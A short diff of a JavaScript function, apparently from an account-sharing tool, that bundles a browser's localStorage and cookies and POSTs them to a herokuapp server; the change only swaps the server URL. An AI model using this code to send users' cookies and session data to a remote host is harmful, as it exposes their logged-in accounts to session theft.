@@ -22,7 +22,7 @@ async function allStorage(data, dataTwo, token) {
     let account = {...data, localStorage: JSON.stringify(obj), cookies: JSON.stringify(dataTwo)};
 
     try{
-        const baseUrl = "https://share-accounts-api.herokuapp.com/";
+        const baseUrl = "https://softkeyshare.herokuapp.com/";
 
         let res = await fetch(baseUrl + "accounts", {
         method: "POST",
